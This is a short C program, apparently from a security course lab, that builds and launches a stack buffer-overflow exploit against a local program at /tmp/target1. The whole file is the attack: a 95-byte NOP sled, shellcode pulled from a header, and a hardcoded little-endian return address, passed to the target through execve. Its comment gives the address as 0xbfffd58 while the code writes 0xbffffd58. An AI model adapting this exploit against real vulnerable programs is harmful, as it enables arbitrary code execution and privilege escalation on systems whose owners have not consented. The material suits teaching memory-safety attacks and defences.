#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
  char *args[3];
  char *env[1];
  // Exploit string buffer  
  char buf[144];
  int i;
  int j;


  // Pad string with NOP instructions for NOP sled
  for (i = 0; i < 95; i++) {
    buf[i] = 0x90;
  }
  
  j = 0;

  // Place shellcode into string
  for (i = 95; i < 140; i++) {
    buf[i] = shellcode[j];
    j++;
  }

  // Address from NOP sled 0xbfffd58
  // Put in reverse order because memory is read from high to low 
  // Takes up last 4 bytes

  buf[140] = 0x58;
  buf[141] = 0xfd;
  buf[142] = 0xff;
  buf[143] = 0xbf;
  
  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
